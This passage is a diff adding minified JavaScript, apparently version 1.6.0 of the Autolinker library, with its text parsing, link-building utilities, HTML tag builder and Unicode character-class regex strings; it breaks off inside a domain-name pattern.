+  b.parse = function(a, c) {
+    return (new b(c)).parse(a);
+  };
+  b.version = "1.6.0";
+  b.prototype = {constructor:b, normalizeUrlsCfg:function(a) {
+    null == a && (a = !0);
+    return "boolean" === typeof a ? {schemeMatches:a, wwwMatches:a, tldMatches:a} : {schemeMatches:"boolean" === typeof a.schemeMatches ? a.schemeMatches : !0, wwwMatches:"boolean" === typeof a.wwwMatches ? a.wwwMatches : !0, tldMatches:"boolean" === typeof a.tldMatches ? a.tldMatches : !0};
+  }, normalizeStripPrefixCfg:function(a) {
+    null == a && (a = !0);
+    return "boolean" === typeof a ? {scheme:a, www:a} : {scheme:"boolean" === typeof a.scheme ? a.scheme : !0, www:"boolean" === typeof a.www ? a.www : !0};
+  }, normalizeTruncateCfg:function(a) {
+    return "number" === typeof a ? {length:a, location:"end"} : b.Util.defaults(a || {}, {length:Number.POSITIVE_INFINITY, location:"end"});
+  }, parse:function(a) {
+    a = this.getHtmlParser().parse(a);
+    for (var c = 0, d = [], b = 0, e = a.length; b < e; b++) {
+      var l = a[b], k = l.getType();
+      "element" === k && "a" === l.getTagName() ? l.isClosing() ? c = Math.max(c - 1, 0) : c++ : "text" === k && 0 === c && (l = this.parseText(l.getText(), l.getOffset()), d.push.apply(d, l));
+    }
+    d = this.compactMatches(d);
+    return d = this.removeUnwantedMatches(d);
+  }, compactMatches:function(a) {
+    a.sort(function(a, c) {
+      return a.getOffset() - c.getOffset();
+    });
+    for (var c = 0; c < a.length - 1; c++) {
+      var d = a[c], b = d.getOffset();
+      d = d.getMatchedText().length;
+      var e = b + d;
+      c + 1 < a.length && (a[c + 1].getOffset() === b ? (b = a[c + 1].getMatchedText().length > d ? c : c + 1, a.splice(b, 1)) : a[c + 1].getOffset() <= e && a.splice(c + 1, 1));
+    }
+    return a;
+  }, removeUnwantedMatches:function(a) {
+    var c = b.Util.remove;
+    this.hashtag || c(a, function(a) {
+      return "hashtag" === a.getType();
+    });
+    this.email || c(a, function(a) {
+      return "email" === a.getType();
+    });
+    this.phone || c(a, function(a) {
+      return "phone" === a.getType();
+    });
+    this.mention || c(a, function(a) {
+      return "mention" === a.getType();
+    });
+    this.urls.schemeMatches || c(a, function(a) {
+      return "url" === a.getType() && "scheme" === a.getUrlMatchType();
+    });
+    this.urls.wwwMatches || c(a, function(a) {
+      return "url" === a.getType() && "www" === a.getUrlMatchType();
+    });
+    this.urls.tldMatches || c(a, function(a) {
+      return "url" === a.getType() && "tld" === a.getUrlMatchType();
+    });
+    return a;
+  }, parseText:function(a, c) {
+    c = c || 0;
+    for (var b = this.getMatchers(), f = [], e = 0, l = b.length; e < l; e++) {
+      for (var k = b[e].parseMatches(a), h = 0, g = k.length; h < g; h++) {
+        k[h].setOffset(c + k[h].getOffset());
+      }
+      f.push.apply(f, k);
+    }
+    return f;
+  }, link:function(a) {
+    if (!a) {
+      return "";
+    }
+    for (var c = this.parse(a), b = [], f = 0, e = 0, l = c.length; e < l; e++) {
+      var k = c[e];
+      b.push(a.substring(f, k.getOffset()));
+      b.push(this.createMatchReturnVal(k));
+      f = k.getOffset() + k.getMatchedText().length;
+    }
+    b.push(a.substring(f));
+    return b.join("");
+  }, createMatchReturnVal:function(a) {
+    var c;
+    this.replaceFn && (c = this.replaceFn.call(this.context, a));
+    return "string" === typeof c ? c : !1 === c ? a.getMatchedText() : c instanceof b.HtmlTag ? c.toAnchorString() : a.buildTag().toAnchorString();
+  }, getHtmlParser:function() {
+    var a = this.htmlParser;
+    a || (a = this.htmlParser = new b.htmlParser.HtmlParser);
+    return a;
+  }, getMatchers:function() {
+    if (this.matchers) {
+      return this.matchers;
+    }
+    var a = b.matcher, c = this.getTagBuilder();
+    return this.matchers = [new a.Hashtag({tagBuilder:c, serviceName:this.hashtag}), new a.Email({tagBuilder:c}), new a.Phone({tagBuilder:c}), new a.Mention({tagBuilder:c, serviceName:this.mention}), new a.Url({tagBuilder:c, stripPrefix:this.stripPrefix, stripTrailingSlash:this.stripTrailingSlash, decodePercentEncoding:this.decodePercentEncoding})];
+  }, getTagBuilder:function() {
+    var a = this.tagBuilder;
+    a || (a = this.tagBuilder = new b.AnchorTagBuilder({newWindow:this.newWindow, truncate:this.truncate, className:this.className}));
+    return a;
+  }};
+  b.match = {};
+  b.matcher = {};
+  b.htmlParser = {};
+  b.truncate = {};
+  b.Util = {abstractMethod:function() {
+    throw "abstract";
+  }, trimRegex:/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, assign:function(a, c) {
+    for (var b in c) {
+      c.hasOwnProperty(b) && (a[b] = c[b]);
+    }
+    return a;
+  }, defaults:function(a, c) {
+    for (var b in c) {
+      c.hasOwnProperty(b) && void 0 === a[b] && (a[b] = c[b]);
+    }
+    return a;
+  }, extend:function(a, c) {
+    var d = a.prototype, f = function() {
+    };
+    f.prototype = d;
+    var e = c.hasOwnProperty("constructor") ? c.constructor : function() {
+      d.constructor.apply(this, arguments);
+    };
+    f = e.prototype = new f;
+    f.constructor = e;
+    f.superclass = d;
+    delete c.constructor;
+    b.Util.assign(f, c);
+    return e;
+  }, ellipsis:function(a, c, b) {
+    if (a.length > c) {
+      if (null == b) {
+        b = "&hellip;";
+        var d = 3;
+      } else {
+        d = b.length;
+      }
+      a = a.substring(0, c - d) + b;
+    }
+    return a;
+  }, indexOf:function(a, c) {
+    if (Array.prototype.indexOf) {
+      return a.indexOf(c);
+    }
+    for (var b = 0, f = a.length; b < f; b++) {
+      if (a[b] === c) {
+        return b;
+      }
+    }
+    return -1;
+  }, remove:function(a, c) {
+    for (var b = a.length - 1; 0 <= b; b--) {
+      !0 === c(a[b]) && a.splice(b, 1);
+    }
+  }, splitAndCapture:function(a, c) {
+    if (!c.global) {
+      throw Error("`splitRegex` must have the 'g' flag set");
+    }
+    for (var b = [], f = 0, e; e = c.exec(a);) {
+      b.push(a.substring(f, e.index)), b.push(e[0]), f = e.index + e[0].length;
+    }
+    b.push(a.substring(f));
+    return b;
+  }, trim:function(a) {
+    return a.replace(this.trimRegex, "");
+  }};
+  b.HtmlTag = b.Util.extend(Object, {whitespaceRegex:/\s+/, constructor:function(a) {
+    b.Util.assign(this, a);
+    this.innerHtml = this.innerHtml || this.innerHTML;
+  }, setTagName:function(a) {
+    this.tagName = a;
+    return this;
+  }, getTagName:function() {
+    return this.tagName || "";
+  }, setAttr:function(a, c) {
+    this.getAttrs()[a] = c;
+    return this;
+  }, getAttr:function(a) {
+    return this.getAttrs()[a];
+  }, setAttrs:function(a) {
+    var c = this.getAttrs();
+    b.Util.assign(c, a);
+    return this;
+  }, getAttrs:function() {
+    return this.attrs || (this.attrs = {});
+  }, setClass:function(a) {
+    return this.setAttr("class", a);
+  }, addClass:function(a) {
+    var c = this.getClass(), d = this.whitespaceRegex, f = b.Util.indexOf;
+    c = c ? c.split(d) : [];
+    for (a = a.split(d); d = a.shift();) {
+      -1 === f(c, d) && c.push(d);
+    }
+    this.getAttrs()["class"] = c.join(" ");
+    return this;
+  }, removeClass:function(a) {
+    var c = this.getClass(), d = this.whitespaceRegex, f = b.Util.indexOf;
+    c = c ? c.split(d) : [];
+    a = a.split(d);
+    for (var e; c.length && (e = a.shift());) {
+      d = f(c, e), -1 !== d && c.splice(d, 1);
+    }
+    this.getAttrs()["class"] = c.join(" ");
+    return this;
+  }, getClass:function() {
+    return this.getAttrs()["class"] || "";
+  }, hasClass:function(a) {
+    return -1 !== (" " + this.getClass() + " ").indexOf(" " + a + " ");
+  }, setInnerHtml:function(a) {
+    this.innerHtml = a;
+    return this;
+  }, getInnerHtml:function() {
+    return this.innerHtml || "";
+  }, toAnchorString:function() {
+    var a = this.getTagName(), c = this.buildAttrsStr();
+    return ["<", a, c ? " " + c : "", ">", this.getInnerHtml(), "</", a, ">"].join("");
+  }, buildAttrsStr:function() {
+    if (!this.attrs) {
+      return "";
+    }
+    var a = this.getAttrs(), c = [], b;
+    for (b in a) {
+      a.hasOwnProperty(b) && c.push(b + '="' + a[b] + '"');
+    }
+    return c.join(" ");
+  }});
+  b.RegexLib = {alphaNumericCharsStr:"A-Za-z\\xAA\\xB5\\xBA\\xC0-\\xD6\\xD8-\\xF6\\xF8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u037f\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u052f\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0-\u08b4\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0980\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0af9\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c39\u0c3d\u0c58-\u0c5a\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d5f-\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f5\u13f8-\u13fd\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16f1-\u16f8\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191e\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2183\u2184\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005\u3006\u3031-\u3035\u303b\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fd5\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua69d\ua6a0-\ua6e5\ua717-\ua71f\ua722-\ua788\ua78b-\ua7ad\ua7b0-\ua7b7\ua7f7-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua8fd\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\ua9e0-\ua9e4\ua9e6-\ua9ef\ua9fa-\ua9fe\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa7e-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uab30-\uab5a\uab5c-\uab65\uab70-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc0-9\u0660-\u0669\u06f0-\u06f9\u07c0-\u07c9\u0966-\u096f\u09e6-\u09ef\u0a66-\u0a6f\u0ae6-\u0aef\u0b66-\u0b6f\u0be6-\u0bef\u0c66-\u0c6f\u0ce6-\u0cef\u0d66-\u0d6f\u0de6-\u0def\u0e50-\u0e59\u0ed0-\u0ed9\u0f20-\u0f29\u1040-\u1049\u1090-\u1099\u17e0-\u17e9\u1810-\u1819\u1946-\u194f\u19d0-\u19d9\u1a80-\u1a89\u1a90-\u1a99\u1b50-\u1b59\u1bb0-\u1bb9\u1c40-\u1c49\u1c50-\u1c59\ua620-\ua629\ua8d0-\ua8d9\ua900-\ua909\ua9d0-\ua9d9\ua9f0-\ua9f9\uaa50-\uaa59\uabf0-\uabf9\uff10-\uff19", 
+  alphaCharsStr:"A-Za-z\\xAA\\xB5\\xBA\\xC0-\\xD6\\xD8-\\xF6\\xF8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u037f\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u052f\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0-\u08b4\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0980\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0af9\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c39\u0c3d\u0c58-\u0c5a\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d5f-\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f5\u13f8-\u13fd\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16f1-\u16f8\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191e\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2183\u2184\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005\u3006\u3031-\u3035\u303b\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fd5\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua69d\ua6a0-\ua6e5\ua717-\ua71f\ua722-\ua788\ua78b-\ua7ad\ua7b0-\ua7b7\ua7f7-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua8fd\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\ua9e0-\ua9e4\ua9e6-\ua9ef\ua9fa-\ua9fe\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa7e-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uab30-\uab5a\uab5c-\uab65\uab70-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc", 
+  domainNameRegex:new RegExp("(?:(?:(?:[A-Za-z\\xAA\\xB5\\xBA\\xC0-\\xD6\\xD8-\\xF6\\xF8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u037f\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u052f\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0-\u08b4\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0980\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0af9\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c39\u0c3d\u0c58-\u0c5a\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d5f-\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f5\u13f8-\u13fd\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16f1-\u16f8\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191e\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2183\u2184\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005\u3006\u3031-\u3035\u303b\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fd5\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua69d\ua6a0-\ua6e5\ua717-\ua71f\ua722-\ua788\ua78b-\ua7ad\ua7b0-\ua7b7\ua7f7-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua8fd\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\ua9e0-\ua9e4\ua9e6-\ua9ef\ua9fa-\ua9fe\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa7e-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uab30-\uab5a\uab5c-\uab65\uab70-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\u